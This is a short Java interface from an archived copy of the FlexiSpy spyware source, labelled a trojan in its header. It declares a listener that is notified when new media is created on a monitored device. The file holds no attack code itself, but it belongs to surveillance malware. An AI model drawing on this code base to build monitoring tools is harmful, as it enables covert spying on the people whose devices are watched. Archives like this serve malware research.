/*
  name      FlexiSpy
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    RamadhanAmizudin/malware
  archived  RamadhanAmizudin, krisyotam (2026)
  notes     —
 */
package com.vvt.mediamon;

import com.vvt.mediamon.info.MediaInfo;

public interface MediaMonitorListener {
	
	public void mediaCreated(MediaInfo mediaInfo);
}
